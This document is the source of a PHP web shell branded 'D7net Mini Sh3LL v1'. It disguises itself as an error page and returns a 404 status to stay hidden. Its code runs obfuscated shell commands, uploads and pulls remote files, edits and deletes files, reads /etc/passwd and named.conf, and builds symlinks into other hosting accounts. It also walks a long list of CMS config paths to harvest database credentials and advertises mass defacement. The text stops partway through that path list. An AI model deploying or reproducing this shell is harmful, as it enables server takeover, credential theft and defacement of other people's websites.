<?php
session_start();
error_reporting(0);
set_time_limit(0);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Eror Page</title>
    <meta name="author" content="D7net">
    <meta name="viewport" content="Kontol" />
    <meta name="description" content="Error Page">
    <meta property="og:description" content="Error Page">
    <meta property="og:image" content="#">
    <meta name="robots" content="noindex">
    <meta name="googlebot" content="noindex">
</head>
<link href="" rel="stylesheet" type="text/css">
<body bgcolor="#092756" text="#ffffff">
<style>
    @import url('https://fonts.googleapis.com/css?family=Dosis');
    @import url('https://fonts.googleapis.com/css?family=Bungee');
body {
    font-family: "Dosis", cursive;
    text-shadow:0px 0px 1px #757575;
}

body::-webkit-scrollbar {
  width: 12px;
}

body::-webkit-scrollbar-track {
  background: #786F6F;
}

body::-webkit-scrollbar-thumb {
  background-color: #000;
  border: 3px solid gray;
}

#content tr:hover {
    background-color: #8084EC;
    text-shadow:0px 0px 10px #fff;
}

#content .first {
    background-color: #4C53F0;
}

#content .first:hover {
    background-color: #8084EC;
    text-shadow:0px 0px 1px #757575;
}

table {
    border: 2px #4C53F0 dotted;
    table-layout: fixed;
    word-break: break-all;
}
input { 
	margin-bottom: 4px; 
	background: rgba(0,0,0,0.3);
	border: none;
	outline: none;
	padding: 5px;
	font-size: 15px;
	color: #fff;
	text-shadow: 1px 1px 1px rgba(0,0,0,0.3);
	border: 1px solid rgba(0,0,0,0.3);
	border-radius: 14px;
	box-shadow: inset 0 -5px 45px rgba(100,100,100,0.2), 0 1px 1px rgba(255,255,255,0.2);
	-webkit-transition: box-shadow .5s ease;
	-moz-transition: box-shadow .5s ease;
	-o-transition: box-shadow .5s ease;
	-ms-transition: box-shadow .5s ease;
	transition: box-shadow .5s ease;
}

textarea {
    max-width: 100%;
    max-height: 100%;
    resize: none;
    outline: none;
    overflow: auto;
	color: #fff;
	text-shadow: 1px 1px 1px rgba(0,0,0,0.3);
	border: 1px solid rgba(0,0,0,0.3);
	border-radius: 4px;
	box-shadow: inset 0 -5px 45px rgba(100,100,100,0.2), 0 1px 1px rgba(255,255,255,0.2);
	-webkit-transition: box-shadow .5s ease;
	-moz-transition: box-shadow .5s ease;
	-o-transition: box-shadow .5s ease;
	-ms-transition: box-shadow .5s ease;
	transition: box-shadow .5s ease;
	background: rgba(0,0,0,0.3);
}

textarea::-webkit-scrollbar {
  width: 12px;
}

textarea::-webkit-scrollbar-track {
  background: #000000;
}

textarea::-webkit-scrollbar-thumb {
  background-color: #fff;
  border: 3px solid black;
}

a {
    color: #ffffff;
    text-decoration: none;
}

a:hover {
    color: #757B89;
    text-shadow:0px 0px 10px #4A7BEC;
}

input,select,textarea {
    border: 1px #000000 solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:5px;
}

.gas {
    background-color: #4C53F0;
    color: #ffffff;
    cursor: pointer;
}

select {
    background-color: transparent;
    color: #ffffff;
}

select:after {
    cursor: pointer;
}

.linka {
    background-color: transparent;
    color: #ffffff;
}

.up {
    background-color: transparent;
    color: #fff;
}

option {
    background-color: #1f1f1f;
}

::-webkit-file-upload-button {
  background: transparent;
  color: #fff;
  border-color: #fff;
  cursor: pointer;
}
.button {
background-color: #000;
border: 5px solid #000;
color: #fff;
line-height: 20px;

}.button:hover {
background-color: #fff;
border-color: #59b1eb;
color: #59b1eb;
}
body, a, a:link{cursor:url(http://4.bp.blogspot.com/-hAF7tPUnmEE/TwGR3lRH0EI/AAAAAAAAAs8/6pki22hc3NE/s1600/ass.png), 
	default;
} 
	a:hover {
	cursor:url(http://3.bp.blogspot.com/-bRikgqeZx0Q/TwGR4MUEC7I/AAAAAAAAAtA/isJmS0r35Qw/s1600/pointer.png),
	wait;
}

</style>
<script>
function setfilename(val)
  {
    filename = val.split('\\').pop().split('/').pop();
    //filename = filename.substring(0, filename.lastIndexOf('.'));
    document.getElementById('namanya').value = filename;
  }

async function loadFile(file) {
    let text = await file.text();
    document.getElementById("bepasdata").innerHTML = text;
}
</script>
<center>
<font face="Bungee" size="5">D7net Mini Sh3LL v1</font></center><br>&nbsp;
<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">	
<tr><td>
<?php
@set_time_limit(0);
@error_reporting(0);
@http_response_code(404);

$disfunc = @ini_get("disable_functions");
if (empty($disfunc)) {
    $disf = "<font color='gold'>NONE</font>";
} else {
    $disf = "<font color='red'>".$disfunc."</font>";
}

function author() {
    echo "<center><br>AnonSec - 2021 | Recode By D7net</center>";
    exit();
}

function cekdir() {
    if (isset($_GET['path'])) {
        $lokasi = $_GET['path'];
    } else {
        $lokasi = getcwd();
    }
    if (is_writable($lokasi)) {
        return "<font color='green'>Writeable</font>";
    } else {
        return "<font color='red'>Writeable</font>";
    }
}

function cekroot() {
    if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
        return "<font color='green'>Writeable</font>";
    } else {
        return "<font color='red'>Writeable</font>";
    }
}

function xrmdir($dir) {
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $path = $dir.'/'.$item;
        if (is_dir($path)) {
            xrmdir($path);
        } else {
            unlink($path);
        }
    }
    rmdir($dir);
}

function dunlut($file) {
    if (!is_readable($file)) {
        red("Cannot Download File / Unreadable File !");
        die();
    }
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($filepath));
    flush();
    readfile($file);
    die();
}

function owner($file) {
    if (function_exists("posix_getpwuid")) {
        $tod = @posix_getpwuid(fileowner($file));
        return "<center>".$tod['name']."</center>";
    } else {
        return "<center>".fileowner($file)."</center>";
    }
}

function cekwrite($lokasi) {
    $izin = substr(sprintf('%o', fileperms($lokasi)), -4);
    if (is_writable($lokasi)) {
        return "<font color=green>".$izin."</font>";
    } else {
        return "<font color=red>".$izin."</font>";
    }
}

function ekse($komend, $lokasi) {
    if (!function_exists("proc_open")) {
        die("proc_open function disabled !");
    } elseif (!function_exists("base64_decode")) {
        die("base64_decode function disabled !");
    }
    $komen = base64_decode(base64_decode(base64_decode($komend)));
    $tod = @proc_open($komen, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $pipes, $lokasi);
    echo "<textarea rows='25' cols='100'>".htmlspecialchars(stream_get_contents($pipes[1]))."</textarea><br><br>";
}

function ipserv() {
    if (empty($_SERVER['SERVER_ADDR'])) {
        return gethostbyname($_SERVER['SERVER_NAME']);
        if (empty(gethostbyname($_SERVER['SERVER_NAME']))) {
            return $_SERVER['SERVER_NAME'];
        }
    } else {
        return $_SERVER['SERVER_ADDR'];
    }
}

function cekfile($file) {
     return '<i class="fa fa-file" style="color: #d6d4ce"></i> ';
}

function filedate($file) {
    return date("F d Y g:i:s", filemtime($file));
}

function unzip($file, $lokasi) {
    if (!is_readable($file)) {
        red("Cannot Unzip File / Unreadable File !");
        die();
    } elseif (strpos(file_get_contents($file), "\x50\x4b\x03\x04") === false) {
        red("This isn't Zip File !");
        die();
    }
    $zip = new ZipArchive;
    $res = $zip -> open($file);
    if ($res == true) {
        $zip -> extractTo($lokasi);
        $zip -> close();
        green("Success Unzip File !");
    } else {
        red("Failed to Unzip File !");
    }
}

function green($text) {
    echo "<center><font color='green'>".$text."</center></font>";
}

function red($text) {
    echo "<center><font color='red'>".$text."</center></font>";
}

if (function_exists("mysql_connect")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; cURL : ";
if (function_exists("curl_init")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; WGET : ";
if (file_exists("/usr/bin/wget")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Perl : ";
if (file_exists("/usr/bin/perl")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Python : ";
if (file_exists("/usr/bin/python2")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}

foreach($_POST as $key => $value){
    $_POST[$key] = stripslashes($value);
}

if(isset($_GET['path'])){
    $lokasi = $_GET['path'];
    $lokdua = $_GET['path'];
} else {
    $lokasi = getcwd();
    $lokdua = getcwd();
}

$lokasi = str_replace('\\','/',$lokasi);
$lokasis = explode('/',$lokasi);
$lokasinya = @scandir($lokasi);

echo "<br>Directory (".cekwrite($lokasi).") : &nbsp;";

foreach($lokasis as $id => $lok){
    if($lok == '' && $id == 0){
        $a = true;
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if($lok == '') continue;
    echo '<a href="?path=';
    for($i=0;$i<=$id;$i++){
    echo "$lokasis[$i]";
    if($i != $id) echo "/";
} 
echo '">'.$lok.'</a>/';
}

echo '</td></tr><tr><td>';
if (isset($_POST['upwkwk'])) {
    if ($_POST['dirnya'] == "2") {
            $lokasi = $_SERVER['DOCUMENT_ROOT'];
        }
    if (isset($_POST['berkasnya'])) {
        $data = @file_put_contents($lokasi."/".$_FILES['berkas']['name'], @file_get_contents($_FILES['berkas']['tmp_name']));
        if (file_exists($lokasi."/".$_FILES['berkas']['name'])) {
            echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_FILES['berkas']['name']."</i></font><br><br>";
        } else {
            echo "<font color='red'>Failed to Upload !<br><br>";
        }
    } elseif (isset($_POST['linknya'])) {
        if (empty($_POST['namalink'])) {
            exit("Filename cannot be empty !");
        }
        if ($_POST['dirnya'] == "2") {
            $lokasi = $_SERVER['DOCUMENT_ROOT'];
        }
        $data = @file_put_contents($lokasi."/".$_POST['namalink'], @file_get_contents($_POST['darilink']));
        if (file_exists($lokasi."/".$_POST['namalink'])) {
            echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_POST['namalink']."</i></font><br><br>";
        } else {
            echo "<font coloe='red'>Failed to Upload !<br><br>";
        }
    } elseif (isset($_POST['bepas'])) {
        $bepasdata = $_POST['bepasdata'];
        $bepasnama = $_POST['bepasnama'];
        if ($bepasdata) {
            echo "string";
        }
        @file_put_contents($lokasi."/".$bepasnama, $bepasdata);
        if (file_exists($lokasi."/".$bepasnama)) {
            echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$bepasnama."</i></font><br><br>";
        } else {
            echo "<font coloe='red'>Failed to Upload !<br><br>";
        }
    }
}

echo "</table><br>";
echo '<table width="100%" border="0" cellpadding="5" cellspacing="5" align="center">';
echo '<th> &nbsp;<a class="button" href="'.$_SERVER['SCRIPT_NAME'].'">Home</a>&nbsp; </th>';
echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&komend=d7net">&#9741; Command</a>&nbsp; </th>';
echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&upload=d7net">&#9741; Upload File</a>&nbsp; </th>';
echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&info=d7net">&#9741;Info Server</a>&nbsp; </th>';
echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&buatfile=d7net">&#9741; Buat File</a>&nbsp; </th>';
echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&mass=d7net">&#9741; Mass deface</a>&nbsp; </th>';
echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&jump=d7net">&#9741; Jumping</a>&nbsp; </th>';
echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&config=d7net">&#9741; Config</a>&nbsp; </th>';
echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&symlink=d7net">&#9741; Symlink</a>&nbsp; </th>';
echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&about=d7net">&#9741; About</a>&nbsp; </th>';
echo "</table><br>";

if (isset($_GET['fileloc'])) {
    echo "<tr><td>Current File : ".$_GET['fileloc'];
    echo '</tr></td></table><br/>';
    echo "<pre>".htmlspecialchars(file_get_contents($_GET['fileloc']))."</pre>";
    author();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
    if (is_dir($_POST['path'])) {
        xrmdir($_POST['path']);
        if (file_exists($_POST['path'])) {
            red("Failed to delete Directory !");
        } else {
            green("Delete Directory Success !");
        }
    } elseif (is_file($_POST['path'])) {
        @unlink($_POST['path']);
        if (file_exists($_POST['path'])) {
            red("Failed to Delete File !");
        } else {
            green("Delete File <i>".basename($_POST['path'])."</i> Success !");
        }
    }
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
    if (isset($_POST['gantin'])) {
        $ren = @rename($_POST['path'], $_POST['newname']);
        if ($ren == true) {
            green("Change Name Success !");
        } else {
            red("Change Name Failed !");
        }
    }
    if (empty($_POST['name'])) {
        $namaawal = $_POST['newname'];
    } else {
        $namawal = $_POST['name'];
    }
    echo "<center>".$_POST['path']."<br>";
    echo '<form method="post">
    New Name : <input name="newname" type="text" class="up" size="20" value="'.$namaawal.'" />
    <input type="hidden" name="path" value="'.$_POST['path'].'">
    <input type="hidden" name="pilih" value="gantinama">
    <input type="submit" value="Change" name="gantin" class="button" style="cursor: pointer; border-color: #fff"/>
    </form>';
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
    if (isset($_POST['gasedit'])) {
        $edit = @file_put_contents($_POST['path'], $_POST['src']);
        if ($edit == true) {
            green("Edit File Success !");
        } else {
            red("Edit File Failed !");
        }
    }
    echo "<center>".$_POST['path']."<br><br>";
    echo '<form method="post">
    <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br>
    <input type="hidden" name="path" value="'.$_POST['path'].'">
    <input type="hidden" name="pilih" value="edit">
    <input type="submit" value="Edit File" name="gasedit" class="button" />
    </form><br>';
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "dunlut") {
    dunlut($_POST['path']);
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "unzip") {
    unzip($_POST['path'], $lokasi);
} elseif ($_REQUEST['upload'] == "d7net") {
    echo "<center>Upload File : ";
    echo '<form enctype="multipart/form-data" method="post">
<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
<input type="radio" value="2" name="dirnya" >document_root [ '.cekroot().' ]
<br>
<input type="hidden" name="upwkwk" value="aplod">
<input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br>
<br>403 Upload File<br>
<input type="file" id="datanya" onchange="setfilename(this.value); loadFile(this.files[0])"/>
<input type="hidden" name="bepasnama" id="namanya">
<textarea style="display: none" id="bepasdata" name="bepasdata"></textarea>
<input type="submit" name="bepas" value="Upload" class="up" style="cursor: pointer; border-color: #fff">
</form><br><br></center>';
} elseif ($_GET['komend'] == "d7net") {
    echo "<center>";
    echo '<form method="post" onsubmit="document.getElementById(\'komendnya\').value = btoa(btoa(btoa(document.getElementById(\'komendnya\').value)))">
    '.@get_current_user().'@'.ipserv().':~ $ <input type="text" name="komend" id="komendnya" style="background-color: #1f1f1f; color: #fff">
    <input type="submit" name="eksekomend" value=" >> " class="up" style="cursor: pointer; border-color: #fff">
    </form><br>';
    if (isset($_POST['eksekomend'])) {
        ekse($_POST['komend'], $lokasi);
    }
    echo "</center>";

} elseif ($_REQUEST['symlink'] == "d7net") {
	if (!is_file('named.txt')) {
        $d00m = @file('/etc/named.conf');
    } else {
        $d00m = @file('named.txt');
    }
    if (!$d00m) {
        die("<hr><br><center><a class='button' href='?path=$lokasi&symread=d7net'>Bypass Read</a> <a class='button' href='?path=$lokasi&sym_404=d7net'>Symlink 404</a> <a class='button' href='?path=$lokasi&sym_bypas=d7net'>Symlink Bypass</a><br><br/><font color='red'>Can't read   /etc/named.conf</font><br/><br/></center><br>");
    } else {
        echo "[ <a href='?path=$dir&symread=d7net'>Bypass Read</a> ] [ <a href='?path=$lokasi&sym_404=d7net'>Symlink 404</a> ] [ <a href='?path=$lokasi&sym_bypas=d7net'>Symlink Bypass</a> ]<div class='tmp'>
                <table align='center' width='100%'>
                    <thead class='bg-info'>
                        <th>Domains</th>
                        <th>Users</th>
                        <th>symlink </th>
                    </thead>";
        foreach ($d00m as $dom) {
            if (eregi('zone', $dom)) {
                preg_match_all('#zone "(.*)"#', $dom, $domsws);
                flush();
                if (strlen(trim($domsws[1][0])) > 2) {
                    $user = posix_getpwuid(@fileowner('/etc/valiases/'.$domsws[1][0]));
                    flush();
                    $site = $user['name'];
                    @symlink('/', 'sym/root');
                    $site = $domsws[1][0];
                    $ir = 'ir';
                    $il = 'il';
                    if (preg_match("/.^$ir/", $domsws[1][0]) or preg_match("/.^$il/", $domsws[1][0])) {
                        $site = ".$domsws[1][0].";
                    }
                    echo "
                                <tr>
                                    <td>
                                        <a target='_blank' href=http://www.".$domsws[1][0].'/>'.$site.' </a>
                                    </td>
                                    <td>
                                        '.$user['name']."
                                    </td>
                                    <td>
                                        <a href='sym/root/home/".$user['name']."/public_html' target='_blank'>Symlink</a>
                                    </td>
                                </tr>";
                    flush();
                    flush();
                }
            }
        }
        echo '</table>
            </div><br/>';
    }
    exit;
}

if ($_GET['symread'] == 'd7net') {
    echo '<center>read /etc/named.conf';
    echo "<form method='post' action='?path=$dir&symread=d7net&save=1'>
            <textarea class='form-control' rows='15' cols='50' name='file'>";
    flush();
    flush();
    $file = '/etc/named.conf';
    $r3ad = @fopen($file, 'r');
    if ($r3ad) {
        $content = @fread($r3ad, @filesize($file));
        echo ''.htmlentities($content).'';
    } elseif (!$r3ad) {
        $r3ad = @highlight_file($file);
    } elseif (!$r3ad) {
        $r3ad = @highlight_file($file);
    } elseif (!$r3ad) {
        $sm = @symlink($file, 'sym.txt');
        if ($sm) {
            $r3ad = @fopen('sym/sym.txt', 'r');
            $content = @fread($r3ad, @filesize($file));
            echo ''.htmlentities($content).'';
        }
    }
    echo "</textarea><br/><input type='submit' class='button' value='Save'/> </form>";
    if (isset($_GET['save'])) {
        $cont = stripcslashes($_POST['file']);
        $f = fopen('named.txt', 'w');
        $w = fwrite($f, $cont);
        if ($w) {
            echo '<br/>save has been successfully</center>';
        }
        fclose($f);
    }
    exit;
}

if ($_GET['sym_404'] == 'd7net') {
    echo '<center><h2>Symlink 404</h2>
        <form method="post">
            File Target: <input type="text" class="form-control" name="dir" style="width: 250px;height: 20px;" value="/home/public_html/wp-config.php"><br><br>
            Save As: <input type="text" class="form-control" name="isi" style="width: 100px;height: 20px;" placeholder="file.txt"/><br><br/>
            <input type="submit" class="button" value="Execute" name="execute"/>
        </form></center>';
    if ($_POST['execute']) {
        rmdir('d7net_sym404');
        mkdir('d7net_sym404', 0777);
        $dir = $_POST['dir'];
        $isi = $_POST['isi'];
        system('ln -s '.$dir.'d7net_sym404/'.$isi);
        symlink($dir, 'd7net_sym404/'.$isi);
        $inija = fopen('d7net_sym404/.htaccess', 'w');
        fwrite($inija, 'ReadmeName '.$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex ids.html\nAddType text/plain .php\nAddHandler text/plain .php\nSatisfy Any");
        echo'<a href="/d7net_sym404/" target="_blank"> >>Sukses<< </a>';
    }
    exit;
}

if ($_GET['sym_bypas'] == 'd7net') {
    if (isset($_GET['save']) and isset($_POST['file']) or @filesize('passwd.txt') > 0) {
        $cont = stripcslashes($_POST['file']);
        if (!file_exists('passwd.txt')) {
            $f = @fopen('passwd.txt', 'w');
            $w = @fwrite($f, $cont);
            fclose($f);
        }
        if ($w or @filesize('passwd.txt') > 0) {
            echo "<div class='tmp mb-4'>
                    <table width='100%'>
                        <thead class='bg-info text-center'>
                            <th>Users</th>
                            <th>symlink</th>
                            <th>FTP</th>
                        </thead>";
            flush();
            $fil3 = file('passwd.txt');
            foreach ($fil3 as $f) {
                $u = explode(':', $f);
                $user = $u['0'];
                echo "<tr class='text-dark'>
                                <td class='text-left pl-1'>$user</td>
                                <td>
                                    <a href='sym/root/home/$user/public_html' target='_blank'>Symlink </a>
                                </td>
                                <td>
                                    <a href='$pageFTP/sym/root/home/$user/public_html' target='_blank'>FTP</a>
                                </td>
                            </tr>";
                flush();
                flush();
            }
            die('</tr></table></div>');
        }
    }

    echo '<center>read /etc/passwd';
    echo "<br/><form method='post' action='?path=$lokasi&sym_bypas=d7net&save=1'>
            <textarea class='form-control' rows='15' cols='50' name='file'>";
    flush();
    $file = '/etc/passwd';
    $r3ad = @fopen($file, 'r');
    if ($r3ad) {
        $content = @fread($r3ad, @filesize($file));
        echo ''.htmlentities($content).'';
    } elseif (!$r3ad) {
        $r3ad = @highlight_file($file);
    } elseif (!$r3ad) {
        $r3ad = @highlight_file($file);
    } elseif (!$r3ad) {
        for ($uid = 0; $uid < 1000; $uid++) {
            $ara = posix_getpwuid($uid);
            if (!empty($ara)) {
                while (list($key, $val) = each($ara)) {
                    echo "$val:";
                }
                echo "\n";
            }
        }
    }
    flush();
    echo "</textarea><br/>
            <input type='submit' class='button' value='Symlink'/><br/>
        </form></center>";
    flush();
    exit;

} elseif ($_REQUEST['config'] == "d7net") {
	$etc = fopen('/etc/passwd', 'r') or die("<center><pre><font color=red>Can't read /etc/passwd</font></pre></center>");
    $con = mkdir('d7net_config', 0777);
    $isi_htc = "Options all\nRequire None\nSatisfy Any";
    $htc = fopen('d7net_config/.htaccess', 'w');
    fwrite($htc, $isi_htc);
    while ($passwd = fgets($etc)) {
        if ($passwd == '' || !$etc) {
            echo "<font color=red>Can't read /etc/passwd</font>";
        } else {
            preg_match_all('/(.*?):x:/', $passwd, $user_config);
            foreach ($user_config[1] as $user_con) {
                $user_config_dir = "/home/$user_con/public_html/";
                if (is_readable($user_config_dir)) {
                    $grab_config =
                    [
                        "/home/$user_con/.my.cnf" => 'cpanel',
                        "/home/$user_con/public_html/config/koneksi.php" => 'Lokomedia',
                        "/home/$user_con/public_html/forum/config.php" => 'phpBB',
                        "/home/$user_con/public_html/sites/default/settings.php" => 'Drupal',
                        "/home/$user_con/public_html/config/settings.inc.php" => 'PrestaShop',
                        "/home/$user_con/public_html/app/etc/local.xml" => 'Magento',
                        "/home/$user_con/public_html/admin/config.php" => 'OpenCart',
                        "/home/$user_con/public_html/application/config/database.php" => 'Ellislab',
                        "/home/$user_con/public_html/vb/includes/config.php" => 'Vbulletin',
                        "/home/$user_con/public_html/includes/config.php" => 'Vbulletin',
                        "/home/$user_con/public_html/forum/includes/config.php" => 'Vbulletin',
                        "/home/$user_con/public_html/forums/includes/config.php" => 'Vbulletin',
                        "/home/$user_con/public_html/cc/includes/config.php" => 'Vbulletin',
                        "/home/$user_con/public_html/inc/config.php" => 'MyBB',
                        "/home/$user_con/public_html/includes/configure.php" => 'OsCommerce',
                        "/home/$user_con/public_html/shop/includes/configure.php" => 'OsCommerce',
                        "/home/$user_con/public_html/os/includes/configure.php" => 'OsCommerce',
                        "/home/$user_con/public_html/oscom/includes/configure.php" => 'OsCommerce',
                        "/home/$user_con/public_html/products/includes/configure.php" => 'OsCommerce',
                        "/home/$user_con/public_html/cart/includes/configure.php" => 'OsCommerce',
                        "/home/$user_con/public_html/inc/conf_global.php" => 'IPB',
                        "/home/$user_con/public_html/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/wp/test/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/blog/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/beta/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/portal/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/site/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/wp/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/WP/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/news/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/wordpress/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/test/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/demo/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/home/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/v1/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/v2/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/press/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/new/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/blogs/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/blog/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/submitticket.php" => '^WHMCS',
                        "/home/$user_con/public_html/cms/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/beta/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/portal/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/site/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/main/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/home/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/demo/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/test/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/v1/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/v2/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/joomla/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/new/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/WHMCS/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/whmcs1/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Whmcs/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/whmcs/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/whmcs/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/WHMC/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Whmc/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/whmc/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/WHM/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Whm/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/whm/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/HOST/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Host/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/host/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/SUPPORTES/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Supportes/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/supportes/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/domains/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/domain/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Hosting/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/HOSTING/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/hosting/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/CART/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Cart/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/cart/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/ORDER/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Order/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/order/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/CLIENT/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Client/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/client/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/CLIENTAREA/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Clientarea/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/clientarea/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/SUPPORT/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Support/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/support/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/BILLING/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Billing/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/billing/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/BUY/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Buy/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/buy/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/MANAGE/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Manage/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/manage/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/CLIENTSUPPORT/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/ClientSupport/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Clientsupport/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/clientsupport/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/CHECKOUT/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Checkout/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/checkout/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/BILLINGS/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Billings/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/billings/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/BASKET/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Basket/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/basket/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/SECURE/submitticket.php" => 'WHMCS',
